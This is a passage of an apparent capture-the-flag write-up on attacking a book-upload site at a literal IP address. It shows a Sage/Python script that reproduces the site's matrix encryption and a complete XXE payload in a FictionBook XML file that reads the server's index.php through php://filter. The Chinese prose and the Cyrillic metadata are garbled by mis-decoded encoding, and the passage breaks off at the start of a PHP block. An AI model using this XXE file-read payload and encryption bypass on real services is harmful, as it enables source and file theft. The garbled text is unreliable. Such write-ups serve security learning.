&#x2F;authorszone</span><br></pre></td></tr></table></figure><p>åœ¨ <code>http://45.77.219.97/authorszone</code> é‡Œé¢æ˜¯ä¸Šä¼ ä¹¦çš„åœ°æ–¹, è€Œä¸”åªèƒ½ä¸Šä¼ åŠ å¯†è¿‡åçš„ä¹¦.<br>å†ç»“åˆä¹‹å‰ä¹¦çš„æœ¬ä½“æ˜¯ xml, é‚£ä¹ˆå¯ä»¥æƒ³åˆ°æ˜¯ XXE äº†.<br>æ¥ä¸‹æ¥æ˜¯å†™å‡ºåŠ å¯†ç®—æ³•, å®é™…ä¸Šå°±æ˜¯çŸ©é˜µæ–¹ç¨‹æ±‚è§£, å› ä¸ºæ˜¯ mod 256 æ•´æ•°ç¯ä¸Šçš„çŸ©é˜µ, ç›´æ¥ç”¨ sage æ¥ç®—äº†.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This file was *autogenerated* from the file matrix.sage</span></span><br><span class="line"><span class="keyword">from</span> sage.all_cmdline <span class="keyword">import</span> *   <span class="comment"># import sage library</span></span><br><span class="line"></span><br><span class="line">_sage_const_256 = Integer(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_solve</span><span class="params">(y)</span>:</span></span><br><span class="line">    mat = [[<span class="number">135</span>, <span class="number">172</span>, <span class="number">38</span>, <span class="number">43</span>, <span class="number">153</span>, <span class="number">164</span>, <span class="number">5</span>, <span class="number">208</span>, <span class="number">80</span>, <span class="number">209</span>, <span class="number">137</span>, <span class="number">114</span>, <span class="number">237</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">214</span>], [<span class="number">25</span>, <span class="number">215</span>, <span class="number">36</span>, <span class="number">81</span>, <span class="number">159</span>, <span class="number">120</span>, <span class="number">106</span>, <span class="number">67</span>, <span class="number">145</span>, <span class="number">222</span>, <span class="number">128</span>, <span class="number">55</span>, <span class="number">209</span>, <span class="number">248</span>, <span class="number">125</span>, <span class="number">115</span>], [<span class="number">77</span>, <span class="number">32</span>, <span class="number">125</span>, <span class="number">161</span>, <span class="number">65</span>, <span class="number">15</span>, <span class="number">129</span>, <span class="number">38</span>, <span class="number">209</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">27</span>, <span class="number">192</span>, <span class="number">117</span>, <span class="number">181</span>, <span class="number">62</span>], [<span class="number">128</span>, <span class="number">243</span>, <span class="number">25</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">156</span>, <span class="number">0</span>, <span class="number">176</span>, <span class="number">77</span>, <span class="number">57</span>, <span class="number">129</span>, <span class="number">58</span>, <span class="number">158</span>, <span class="number">236</span>, <span class="number">216</span>], [<span class="number">251</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">26</span>, <span class="number">231</span>, <span class="number">121</span>, <span class="number">145</span>, <span class="number">246</span>, <span class="number">31</span>, <span class="number">188</span>, <span class="number">24</span>, <span class="number">61</span>, <span class="number">47</span>, <span class="number">17</span>, <span class="number">40</span>, <span class="number">239</span>], [<span class="number">9</span>, <span class="number">44</span>, <span class="number">38</span>, <span class="number">102</span>, <span class="number">133</span>, <span class="number">90</span>, <span class="number">228</span>, <span class="number">90</span>, <span class="number">250</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">196</span>, <span class="number">238</span>, <span class="number">87</span>, <span class="number">99</span>, <span class="number">44</span>], [<span class="number">168</span>, <span class="number">134</span>, <span class="number">246</span>, <span class="number">238</span>, <span class="number">139</span>, <span class="number">62</span>, <span class="number">50</span>, <span class="number">54</span>, <span class="number">68</span>, <span class="number">125</span>, <span class="number">125</span>, <span class="number">244</span>, <span class="number">147</span>, <span class="number">247</span>, <span class="number">141</span>, <span class="number">111</span>], [<span class="number">169</span>, <span class="number">5</span>, <span class="number">241</span>, <span class="number">143</span>, <span class="number">200</span>, <span class="number">163</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">90</span>, <span class="number">90</span>, <span class="number">252</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">205</span>, <span class="number">232</span>, <span class="number">69</span>], [<span class="number">158</span>, <span class="number">22</span>, <span class="number">34</span>, <span class="number">134</span>, <span class="number">78</span>, <span class="number">231</span>, <span class="number">209</span>, <span class="number">115</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">140</span>, <span class="number">191</span>, <span class="number">244</span>, <span class="number">16</span>, <span class="number">115</span>, <span class="number">135</span>], [<span class="number">82</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">142</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">164</span>, <span class="number">172</span>, <span class="number">94</span>, <span class="number">10</span>, <span class="number">90</span>, <span class="number">242</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">85</span>, <span class="number">142</span>], [<span class="number">7</span>, <span class="number">89</span>, <span class="number">153</span>, <span class="number">221</span>, <span class="number">197</span>, <span class="number">173</span>, <span class="number">50</span>, <span class="number">92</span>, <span class="number">112</span>, <span class="number">80</span>, <span class="number">250</span>, <span class="number">188</span>, <span class="number">134</span>, <span class="number">123</span>, <span class="number">100</span>, <span class="number">248</span>], [<span class="number">213</span>, <span class="number">130</span>, <span class="number">238</span>, <span class="number">135</span>, <span class="number">62</span>, <span class="number">36</span>, <span class="number">115</span>, <span class="number">153</span>, <span class="number">161</span>, <span class="number">103</span>, <span class="number">132</span>, <span class="number">254</span>, <span class="number">184</span>, <span class="number">255</span>, <span class="number">205</span>, <span class="number">240</span>], [<span class="number">229</span>, <span class="number">171</span>, <span class="number">105</span>, <span class="number">141</span>, <span class="number">167</span>, <span class="number">125</span>, <span class="number">230</span>, <span class="number">102</span>, <span class="number">234</span>, <span class="number">77</span>, <span class="number">220</span>, <span class="number">166</span>, <span class="number">235</span>, <span class="number">3</span>, <span class="number">190</span>, <span class="number">180</span>], [<span class="number">180</span>, <span class="number">42</span>, <span class="number">228</span>, <span class="number">241</span>, <span class="number">79</span>, <span class="number">92</span>, <span class="number">125</span>, <span class="number">32</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">194</span>, <span class="number">59</span>, <span class="number">16</span>, <span class="number">89</span>, <span class="number">84</span>, <span class="number">157</span>], [<span class="number">50</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">71</span>, <span class="number">221</span>, <span class="number">123</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">204</span>, <span class="number">139</span>, <span class="number">154</span>, <span class="number">232</span>, <span class="number">53</span>, <span class="number">11</span>, <span class="number">226</span>, <span class="number">41</span>], [<span class="number">53</span>, <span class="number">122</span>, <span class="number">86</span>, <span class="number">237</span>, <span class="number">92</span>, <span class="number">165</span>, <span class="number">76</span>, <span class="number">21</span>, <span class="number">79</span>, <span class="number">178</span>, <span class="number">121</span>, <span class="number">94</span>, <span class="number">81</span>, <span class="number">98</span>, <span class="number">217</span>, <span class="number">105</span>]]</span><br><span class="line">    R = IntegerModRing(_sage_const_256 )</span><br><span class="line">    y = vector(R, y)</span><br><span class="line">    mat = matrix(R, mat)</span><br><span class="line">    ret = mat.solve_right(y)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mminus = [</span><br><span class="line">    <span class="number">135</span>, <span class="number">25</span>, <span class="number">77</span>, <span class="number">128</span>, <span class="number">251</span>, <span class="number">9</span>, <span class="number">168</span>, <span class="number">169</span>, <span class="number">158</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">213</span>, <span class="number">229</span>, <span class="number">180</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">172</span>,</span><br><span class="line">    <span class="number">215</span>, <span class="number">32</span>, <span class="number">243</span>, <span class="number">113</span>, <span class="number">44</span>, <span class="number">134</span>, <span class="number">5</span>, <span class="number">22</span>, <span class="number">41</span>, <span class="number">89</span>, <span class="number">130</span>, <span class="number">171</span>, <span class="number">42</span>, <span class="number">81</span>, <span class="number">122</span>, <span class="number">38</span>, <span class="number">36</span>,</span><br><span class="line">    <span class="number">125</span>, <span class="number">25</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">246</span>, <span class="number">241</span>, <span class="number">34</span>, <span class="number">33</span>, <span class="number">153</span>, <span class="number">238</span>, <span class="number">105</span>, <span class="number">228</span>, <span class="number">82</span>, <span class="number">86</span>, <span class="number">43</span>, <span class="number">81</span>,</span><br><span class="line">    <span class="number">161</span>, <span class="number">104</span>, <span class="number">26</span>, <span class="number">102</span>, <span class="number">238</span>, <span class="number">143</span>, <span class="number">134</span>, <span class="number">142</span>, <span class="number">221</span>, <span class="number">135</span>, <span class="number">141</span>, <span class="number">241</span>, <span class="number">71</span>, <span class="number">237</span>, <span class="number">153</span>,</span><br><span class="line">    <span class="number">159</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">231</span>, <span class="number">133</span>, <span class="number">139</span>, <span class="number">200</span>, <span class="number">78</span>, <span class="number">53</span>, <span class="number">197</span>, <span class="number">62</span>, <span class="number">167</span>, <span class="number">79</span>, <span class="number">221</span>, <span class="number">92</span>, <span class="number">164</span>,</span><br><span class="line">    <span class="number">120</span>, <span class="number">15</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">90</span>, <span class="number">62</span>, <span class="number">163</span>, <span class="number">231</span>, <span class="number">118</span>, <span class="number">173</span>, <span class="number">36</span>, <span class="number">125</span>, <span class="number">92</span>, <span class="number">123</span>, <span class="number">165</span>, <span class="number">5</span>,</span><br><span class="line">    <span class="number">106</span>, <span class="number">129</span>, <span class="number">156</span>, <span class="number">145</span>, <span class="number">228</span>, <span class="number">50</span>, <span class="number">99</span>, <span class="number">209</span>, <span class="number">164</span>, <span class="number">50</span>, <span class="number">115</span>, <span class="number">230</span>, <span class="number">125</span>, <span class="number">17</span>, <span class="number">76</span>, <span class="number">208</span>,</span><br><span class="line">    <span class="number">67</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">246</span>, <span class="number">90</span>, <span class="number">54</span>, <span class="number">107</span>, <span class="number">115</span>, <span class="number">172</span>, <span class="number">92</span>, <span class="number">153</span>, <span class="number">102</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">21</span>, <span class="number">80</span>, <span class="number">145</span>,</span><br><span class="line">    <span class="number">209</span>, <span class="number">176</span>, <span class="number">31</span>, <span class="number">250</span>, <span class="number">68</span>, <span class="number">90</span>, <span class="number">243</span>, <span class="number">94</span>, <span class="number">112</span>, <span class="number">161</span>, <span class="number">234</span>, <span class="number">223</span>, <span class="number">204</span>, <span class="number">79</span>, <span class="number">209</span>, <span class="number">222</span>,</span><br><span class="line">    <span class="number">16</span>, <span class="number">77</span>, <span class="number">188</span>, <span class="number">221</span>, <span class="number">125</span>, <span class="number">90</span>, <span class="number">112</span>, <span class="number">10</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">77</span>, <span class="number">99</span>, <span class="number">139</span>, <span class="number">178</span>, <span class="number">137</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">57</span>, <span class="number">24</span>, <span class="number">243</span>, <span class="number">125</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">90</span>, <span class="number">250</span>, <span class="number">132</span>, <span class="number">220</span>, <span class="number">194</span>, <span class="number">154</span>, <span class="number">121</span>, <span class="number">114</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">27</span>, <span class="number">129</span>, <span class="number">61</span>, <span class="number">196</span>, <span class="number">244</span>, <span class="number">42</span>, <span class="number">191</span>, <span class="number">242</span>, <span class="number">188</span>, <span class="number">254</span>, <span class="number">166</span>, <span class="number">59</span>, <span class="number">232</span>, <span class="number">94</span>, <span class="number">237</span>, <span class="number">209</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">238</span>, <span class="number">147</span>, <span class="number">6</span>, <span class="number">244</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">184</span>, <span class="number">235</span>, <span class="number">16</span>, <span class="number">53</span>, <span class="number">81</span>, <span class="number">121</span>, <span class="number">248</span>,</span><br><span class="line">    <span class="number">117</span>, <span class="number">158</span>, <span class="number">17</span>, <span class="number">87</span>, <span class="number">247</span>, <span class="number">205</span>, <span class="number">16</span>, <span class="number">129</span>, <span class="number">123</span>, <span class="number">255</span>, <span class="number">3</span>, <span class="number">89</span>, <span class="number">11</span>, <span class="number">98</span>, <span class="number">58</span>, <span class="number">125</span>, <span class="number">181</span>,</span><br><span class="line">    <span class="number">236</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">115</span>, <span class="number">85</span>, <span class="number">100</span>, <span class="number">205</span>, <span class="number">190</span>, <span class="number">84</span>, <span class="number">226</span>, <span class="number">217</span>, <span class="number">214</span>, <span class="number">115</span>, <span class="number">62</span>,</span><br><span class="line">    <span class="number">216</span>, <span class="number">239</span>, <span class="number">44</span>, <span class="number">111</span>, <span class="number">69</span>, <span class="number">135</span>, <span class="number">142</span>, <span class="number">248</span>, <span class="number">240</span>, <span class="number">180</span>, <span class="number">157</span>, <span class="number">41</span>, <span class="number">105</span></span><br><span class="line">]</span><br><span class="line">Pminus = [</span><br><span class="line">    <span class="string">'\f'</span>, <span class="string">'\x0F'</span>, <span class="string">'\x0E'</span>, <span class="string">'\b'</span>, <span class="string">'\x03'</span>, <span class="string">'\v'</span>, <span class="string">'\r'</span>, <span class="string">'\0'</span>, <span class="string">'\a'</span>, <span class="string">'\t'</span>, <span class="string">'\n'</span>,</span><br><span class="line">    <span class="string">'\x06'</span>, <span class="string">'\x02'</span>, <span class="string">'\x01'</span>, <span class="string">'\x05'</span>, <span class="string">'\x04'</span></span><br><span class="line">]</span><br><span class="line">rPminus = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> seq, c <span class="keyword">in</span> enumerate(Pminus):</span><br><span class="line">    Pminus[seq] = ord(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    rPminus.append(Pminus.index(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    block = bytearray(block)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        tmp = bytearray([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)])</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            tmp[l] = block[rPminus[l]]</span><br><span class="line">        block = tmp</span><br><span class="line">        block = get_solve(list(block))</span><br><span class="line">    <span class="keyword">return</span> bytearray(block)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data)</span>:</span></span><br><span class="line">    data = zlib.compress(data)</span><br><span class="line">    data = bytearray(data)</span><br><span class="line">    pad = <span class="number">16</span> - len(data) % <span class="number">16</span></span><br><span class="line">    data.extend([pad <span class="keyword">for</span> _ <span class="keyword">in</span> range(pad)])</span><br><span class="line">    </span><br><span class="line">    enc = bytearray()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(data), <span class="number">16</span>):</span><br><span class="line">        enc.extend(encrypt_block(data[i:i + <span class="number">16</span>]))</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line">r = encrypt(open(<span class="string">'evil.xml'</span>).read())</span><br><span class="line">open(<span class="string">'evil.fb2enc'</span>, <span class="string">'w'</span>).write(r)</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ„é€ æ¶æ„ xml å¹¶åŠ å¯†ä¸Šä¼ , è¿™ä¸ªå¯ä»¥æŠŠæ­£æ–‡ç»™åˆ äº†, èŠ‚çœåŠ å¯†æ—¶é—´</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/proc/self/cwd/index.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FictionBook</span> <span class="attr">xmlns:l</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.gribuser.ru/xml/fictionbook/2.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">title-info</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">genre</span>&gt;</span>fiction<span class="tag">&lt;/<span class="name">genre</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">first-name</span>&gt;</span>ĞĞ½Ñ‚ÑƒĞ°Ğ½<span class="tag">&lt;/<span class="name">first-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">middle-name</span>&gt;</span>Ğ´Ğµ Ğ¡ĞµĞ½Ñ‚<span class="tag">&lt;/<span class="name">middle-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">last-name</span>&gt;</span>Ğ­ĞºĞ·ÑĞ¿ĞµÑ€Ğ¸<span class="tag">&lt;/<span class="name">last-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">book-title</span>&gt;</span>ĞœĞ°Ğ»ĞµĞ½ÑŒĞºĞ¸Ğ¹ ĞŸÑ€Ğ¸Ğ½Ñ†<span class="tag">&lt;/<span class="name">book-title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">annotation</span>&gt;</span></span><br><span class="line">                123</span><br><span class="line">            <span class="tag">&lt;/<span class="name">annotation</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">date</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">coverpage</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">image</span> <span class="attr">l:href</span>=<span class="string">"#cover.jpg"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">coverpage</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">lang</span>&gt;</span>ru<span class="tag">&lt;/<span class="name">lang</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">src-lang</span>&gt;</span>fr<span class="tag">&lt;/<span class="name">src-lang</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">translator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">first-name</span>&gt;</span>ĞĞ¾Ñ€Ğ°<span class="tag">&lt;/<span class="name">first-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">last-name</span>&gt;</span>Ğ“Ğ°Ğ»ÑŒ<span class="tag">&lt;/<span class="name">last-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">home-page</span>&gt;</span>http://www.vavilon.ru/noragal/content.html<span class="tag">&lt;/<span class="name">home-page</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">translator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">title-info</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">document-info</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">first-name</span>&gt;</span>Ğ”Ğ¼Ğ¸Ñ‚Ñ€Ğ¸Ğ¹<span class="tag">&lt;/<span class="name">first-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">middle-name</span>&gt;</span>ĞŸĞµÑ‚Ñ€Ğ¾Ğ²Ğ¸Ñ‡<span class="tag">&lt;/<span class="name">middle-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">last-name</span>&gt;</span>Ğ“Ñ€Ğ¸Ğ±Ğ¾Ğ²<span class="tag">&lt;/<span class="name">last-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">email</span>&gt;</span>grib@gribuser.ru<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">first-name</span>&gt;</span>Faiber<span class="tag">&lt;/<span class="name">first-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">last-name</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">email</span>&gt;</span>faiber@yandex.ru<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">program-used</span>&gt;</span>FB Tools<span class="tag">&lt;/<span class="name">program-used</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">date</span>&gt;</span>2006-01-14<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">src-url</span>&gt;</span>http://www.vavilon.ru/noragal/pp/<span class="tag">&lt;/<span class="name">src-url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">src-ocr</span>&gt;</span>Ğ¡Ğ¿Ñ€Ğ°Ğ²Ğ¾Ñ‡Ğ½Ğ°Ñ Ğ¡Ğ»ÑƒĞ¶Ğ±Ğ° Ğ ÑƒÑÑĞºĞ¾Ğ³Ğ¾ Ğ¯Ğ·Ñ‹ĞºĞ°<span class="tag">&lt;/<span class="name">src-ocr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>0CB33702-6AE9-4377-9AFA-3BA2EF2F37F6<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">history</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>v 1.1 â€”Â Ğ´Ğ¾Ğ¿Ğ¾Ğ»Ğ½Ğ¸Ñ‚ĞµĞ»ÑŒĞ½Ğ¾Ğµ Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸ĞµÂ â€” Faiber<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>v 1.2 â€”Â Ğ¸Ğ·Ğ¼ĞµĞ½ĞµĞ½Ğ° Ğ¾Ğ±Ğ»Ğ¾Ğ¶ĞºĞ°Â â€” Faiber<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">history</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">document-info</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">publish-info</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">book-name</span>&gt;</span>ĞœĞ°Ğ»ĞµĞ½ÑŒĞºĞ¸Ğ¹ ĞŸÑ€Ğ¸Ğ½Ñ†<span class="tag">&lt;/<span class="name">book-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">city</span>&gt;</span>Ğ¤Ñ€ÑƒĞ½Ğ·Ğµ<span class="tag">&lt;/<span class="name">city</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">year</span>&gt;</span>1982<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">publish-info</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">custom-info</span> <span class="attr">info-type</span>=<span class="string">"general"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>ĞĞ½Ñ‚ÑƒĞ°Ğ½ Ğ´Ğµ Ğ¡ĞµĞ½Ñ‚-Ğ­ĞºĞ·ÑĞ¿ĞµÑ€Ğ¸<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">empty-line</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>ĞœĞ°Ğ»ĞµĞ½ÑŒĞºĞ¸Ğ¹ Ğ¿Ñ€Ğ¸Ğ½Ñ†<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">            123</span><br><span class="line">        <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FictionBook</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨ xxe, å°±èƒ½è¯»æ–‡ä»¶äº†, è¿™é‡Œå„ç§å°è¯•, fuzz å‡ºæ¥ <code>/proc/self/cwd/index.php</code>, å¯ä»¥ç›´æ¥è¯»åˆ°æºç .</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 